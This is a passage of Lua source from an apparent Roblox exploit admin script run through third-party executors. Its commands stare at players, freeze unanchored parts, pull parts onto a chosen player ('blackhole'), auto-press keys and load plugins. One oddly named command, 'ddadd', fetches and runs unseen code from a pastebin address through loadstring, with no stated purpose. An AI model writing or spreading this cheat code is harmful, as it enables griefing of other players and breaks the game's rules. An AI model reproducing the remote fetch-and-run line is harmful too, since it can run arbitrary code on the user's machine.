				local tPos=Players[v].Character:FindFirstChild("HumanoidRootPart").Position
				local modTPos=Vector3.new(tPos.X,chrPos.Y,tPos.Z)
				local newCF=CFrame.new(chrPos,modTPos)
				Players.LocalPlayer.Character:SetPrimaryPartCFrame(newCF)
			elseif not Players:FindFirstChild(v) then
				stareLoop:Disconnect()
			end
		end

		stareLoop = game:GetService("RunService").RenderStepped:Connect(stareFunc)
	end
end)

addcmd('unstareat',{'unstare','nostare','nostareat'},function(args, speaker)
	if stareLoop then
		stareLoop:Disconnect()
	end
end)

addcmd('removeterrain',{'rterrain','noterrain'},function(args, speaker)
	workspace:FindFirstChildOfClass('Terrain'):Clear()
end)

addcmd('clearnilinstances',{'nonilinstances','cni'},function(args, speaker)
	if getnilinstances then
		for i,v in pairs(getnilinstances()) do
			v:Destroy()
		end
	else
		notify('Incompatible Exploit','Your exploit does not support this command (missing getnilinstances)')
	end
end)

addcmd('blackhole',{'nagato','meteor','planetarydevastation','gravityball','allmightypull','planetarydeva'},function(args, speaker)
	if sethidden then
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local Forces = {}
			for _,part in pairs(workspace:GetDescendants()) do
				if Players[v].Character:FindFirstChild('Head') and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(speaker.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
					for i,c in pairs(part:GetChildren()) do
						if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
							c:Destroy()
						end
					end
					local ForceInstance = Instance.new("BodyPosition")
					ForceInstance.Parent = part
					ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
					table.insert(Forces, ForceInstance)
					if not table.find(frozenParts,part) then
						table.insert(frozenParts,part)
					end
				end
			end
			if not simRadius then
				execCmd('simulationradius')
			end
			for i,c in pairs(Forces) do
				c.Position = Players[v].Character.Head.Position
			end
		end
	else
		notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
	end
end)

local freezingua = nil
frozenParts = {}
addcmd('freezeunanchored',{'freezeua'},function(args, speaker)
	if sethidden then
		local badnames = {
			"Head",
			"UpperTorso",
			"LowerTorso",
			"RightUpperArm",
			"LeftUpperArm",
			"RightLowerArm",
			"LeftLowerArm",
			"RightHand",
			"LeftHand",
			"RightUpperLeg",
			"LeftUpperLeg",
			"RightLowerLeg",
			"LeftLowerLeg",
			"RightFoot",
			"LeftFoot",
			"Torso",
			"Right Arm",
			"Left Arm",
			"Right Leg",
			"Left Leg",
			"HumanoidRootPart"
		}
		local function FREEZENOOB(v)
			if v:IsA("BasePart" or "UnionOperation") and v.Anchored == false then
				local BADD = false
				for i = 1,#badnames do
					if v.Name == badnames[i] then
						BADD = true
					end
				end
				if speaker.Character and v:IsDescendantOf(speaker.Character) then
					BADD = true
				end
				if BADD == false then
					for i,c in pairs(v:GetChildren()) do
						if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
							c:Destroy()
						end
					end
					if not simRadius then
						execCmd('simulationradius')
					end
					local bodypos = Instance.new("BodyPosition")
					bodypos.Parent = v
					bodypos.Position = v.Position
					bodypos.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
					local bodygyro = Instance.new("BodyGyro")
					bodygyro.Parent = v
					bodygyro.CFrame = v.CFrame
					bodygyro.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
					if not table.find(frozenParts,v) then
						table.insert(frozenParts,v)
					end
				end
			end
		end
		for i,v in pairs(workspace:GetDescendants()) do
			FREEZENOOB(v)
		end
		freezingua = workspace.DescendantAdded:Connect(FREEZENOOB)
	else
		notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
	end
end)

addcmd('thawunanchored',{'thawua','unfreezeunanchored','unfreezeua'},function(args, speaker)
	if sethidden then
		if freezingua then
			freezingua:Disconnect()
		end
		if not simRadius then
			execCmd('simulationradius')
		end
		for i,v in pairs(frozenParts) do
			for i,c in pairs(v:GetChildren()) do
				if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
					c:Destroy()
				end
			end
		end
		frozenParts = {}
	else
		notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
	end
end)

addcmd('ddadd',{'asa'},function(args, speaker)
	loadstring(game:HttpGet("pastebin.com/raw/hadgd"))()
end)

keycodeMap = {
	["0"] = 0x30,
	["1"] = 0x31,
	["2"] = 0x32,
	["3"] = 0x33,
	["4"] = 0x34,
	["5"] = 0x35,
	["6"] = 0x36,
	["7"] = 0x37,
	["8"] = 0x38,
	["9"] = 0x39,
	["a"] = 0x41,
	["b"] = 0x42,
	["c"] = 0x43,
	["d"] = 0x44,
	["e"] = 0x45,
	["f"] = 0x46,
	["g"] = 0x47,
	["h"] = 0x48,
	["i"] = 0x49,
	["j"] = 0x4A,
	["k"] = 0x4B,
	["l"] = 0x4C,
	["m"] = 0x4D,
	["n"] = 0x4E,
	["o"] = 0x4F,
	["p"] = 0x50,
	["q"] = 0x51,
	["r"] = 0x52,
	["s"] = 0x53,
	["t"] = 0x54,
	["u"] = 0x55,
	["v"] = 0x56,
	["w"] = 0x57,
	["x"] = 0x58,
	["y"] = 0x59,
	["z"] = 0x5A,
	["enter"] = 0x0D,
	["shift"] = 0x10,
	["ctrl"] = 0x11,
	["alt"] = 0x12,
	["pause"] = 0x13,
	["capslock"] = 0x14,
	["spacebar"] = 0x20,
	["pageup"] = 0x21,
	["pagedown"] = 0x22,
	["end"] = 0x23,
	["home"] = 0x24,
	["left"] = 0x25,
	["up"] = 0x26,
	["right"] = 0x27,
	["down"] = 0x28,
	["insert"] = 0x2D,
	["delete"] = 0x2E,
	["f1"] = 0x70,
	["f2"] = 0x71,
	["f3"] = 0x72,
	["f4"] = 0x73,
	["f5"] = 0x74,
	["f6"] = 0x75,
	["f7"] = 0x76,
	["f8"] = 0x77,
	["f9"] = 0x78,
	["f10"] = 0x79,
	["f11"] = 0x7A,
	["f12"] = 0x7B,
}
autoKeyPressing = false
cancelAutoKeyPress = nil

addcmd('autokeypress',{'keypress'},function(args, speaker)
	if keypress and keyrelease and args[1] then
		local code = keycodeMap[args[1]:lower()]
		if not code then notify('Auto Key Press',"Invalid key") return end
		execCmd('unautokeypress')
		wait()
		local clickDelay = 0.1
		local releaseDelay = 0.1
		if args[2] and isNumber(args[2]) then clickDelay = args[2] end
		if args[3] and isNumber(args[3]) then releaseDelay = args[3] end
		autoKeyPressing = true
		cancelAutoKeyPress = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
			if not gameProcessedEvent then
				if (input.KeyCode == Enum.KeyCode.Backspace and UserInputService:IsKeyDown(Enum.KeyCode.Equals)) or (input.KeyCode == Enum.KeyCode.Equals and UserInputService:IsKeyDown(Enum.KeyCode.Backspace)) then
					autoKeyPressing = false
					cancelAutoKeyPress:Disconnect()
				end
			end
		end)
		notify('Auto Key Press',"Press [backspace] and [=] at the same time to stop")
		repeat wait(clickDelay)
			keypress(code)
			wait(releaseDelay)
			keyrelease(code)
		until autoKeyPressing == false
		if cancelAutoKeyPress then cancelAutoKeyPress:Disconnect() keyrelease(code) end
	else
		notify('Auto Key Press',"Your exploit doesn't have the ability to use auto key press")
	end
end)

addcmd('unautokeypress',{'noautokeypress','unkeypress','nokeypress'},function(args, speaker)
	autoKeyPressing = false
	if cancelAutoKeyPress then cancelAutoKeyPress:Disconnect() end
end)

addcmd('addplugin',{'plugin'},function(args, speaker)
	addPlugin(getstring(1))
end)

addcmd('removeplugin',{'deleteplugin'},function(args, speaker)
	deletePlugin(getstring(1))
end)

addcmd('reloadplugin',{},function(args, speaker)
	local pluginName = getstring(1)
	deletePlugin(pluginName)
	wait(1)
	addPlugin(pluginName)
end)

addcmd('removecmd',{'deletecmd'},function(args, speaker)
	removecmd(args[1])
end)

updateColors(currentShade1,shade1)
updateColors(currentShade2,shade2)
updateColors(currentShade3,shade3)
updateColors(currentText1,text1)
updateColors(currentText2,text2)
updateColors(currentScroll,scroll)

if PluginsTable ~= nil or PluginsTable ~= {} then
	FindPlugins(PluginsTable)
end

-- Events
eventEditor.RegisterEvent("OnExecute")
eventEditor.RegisterEvent("OnSpawn",{
	{Type="Player",Name="Player Filter ($1)"}
})
eventEditor.RegisterEvent("OnDied",{
	{Type="Player",Name="Player Filter ($1)"}
})
eventEditor.RegisterEvent("OnDamage",{
	{Type="Player",Name="Player Filter ($1)"},
	{Type="Number",Name="Below Health ($2)"}
})
eventEditor.RegisterEvent("OnKilled",{
	{Type="Player",Name="Victim Player ($1)"},
	{Type="Player",Name="Killer Player ($2)",Default = 1}
})
eventEditor.RegisterEvent("OnJoin",{
	{Type="Player",Name="Player Filter ($1)",Default = 1}
})
eventEditor.RegisterEvent("OnChatted",{
	{Type="Player",Name="Player Filter ($1)",Default = 1},
	{Type="String",Name="Message Filter ($2)"}
})

function hookCharEvents(plr,instant)
	local char = plr.Character
	if not char then return end

	local humanoid = char:WaitForChild("Humanoid",10)
	if not humanoid then return end

	local oldHealth = humanoid.Health
	humanoid.HealthChanged:Connect(function(health)
		local change = math.abs(oldHealth - health)
		if oldHealth > health then
			eventEditor.FireEvent("OnDamage",plr.Name,tonumber(health))
		end
		oldHealth = health
	end)

	humanoid.Died:Connect(function()
		eventEditor.FireEvent("OnDied",plr.Name)

		local killedBy = humanoid:FindFirstChild("creator")
		if killedBy and killedBy.Value and killedBy.Value.Parent then
			eventEditor.FireEvent("OnKilled",plr.Name,killedBy.Name)
		end
	end)
end

Players.PlayerAdded:Connect(function(plr)
	eventEditor.FireEvent("OnJoin",plr.Name)
	plr.Chatted:Connect(function(msg) eventEditor.FireEvent("OnChatted",tostring(plr),msg) end)
	plr.CharacterAdded:Connect(function() eventEditor.FireEvent("OnSpawn",tostring(plr)) hookCharEvents(plr) end)
	JoinLog(plr)
	ChatLog(plr)
	if ESPenabled then
		repeat wait(1) until plr.Character and getRoot(plr.Character)
		ESP(plr)
	end
	if CHMSenabled then
		repeat wait(1) until plr.Character and getRoot(plr.Character)
		CHMS(plr)
	end
end)

for _,plr in pairs(Players:GetPlayers()) do
	pcall(function()
		plr.Chatted:Connect(function(msg) eventEditor.FireEvent("OnChatted",tostring(plr),msg) end)
		plr.CharacterAdded:Connect(function() eventEditor.FireEvent("OnSpawn",tostring(plr)) hookCharEvents(plr) end)
		hookCharEvents(plr)
	end)
end

if spawnCmds and #spawnCmds > 0 then
	for i,v in pairs(spawnCmds) do
		eventEditor.AddCmd("OnSpawn",{v.COMMAND or "",{0},v.DELAY or 0})
	end
	updatesaves()
end

if loadedEventData then eventEditor.LoadData(loadedEventData) end
eventEditor.Refresh()

eventEditor.FireEvent("OnExecute")

if aliases and #aliases > 0 then
	local cmdMap = {}
	for i,v in pairs(cmds) do
		cmdMap[v.NAME:lower()] = v
		for _,alias in pairs(v.ALIAS) do
			cmdMap[alias:lower()] = v
		end
	end
	for i = 1, #aliases do
		local cmd = string.lower(aliases[i].CMD)
		local alias = string.lower(aliases[i].ALIAS)
		if cmdMap[cmd] then
			customAlias[alias] = cmdMap[cmd]
		end
	end
	refreshaliases()
end

wait()
Credits:TweenPosition(UDim2.new(0,0,0.9,0), "Out", "Quart", 0.2)
Logo:TweenSizeAndPosition(UDim2.new(0,175,0,175),UDim2.new(0,37,0,45), "Out", "Quart", 0.3)
wait(1)
for i=0,1,0.1 do
	Logo.ImageTransparency = i
	IntroBackground.BackgroundTransparency = i
	wait()
end
Credits:TweenPosition(UDim2.new(0,0,0.9,30), "Out", "Quart", 0.2)
wait(0.2)
Logo:Destroy()
Credits:Destroy()
IntroBackground:Destroy()
minimizeHolder()
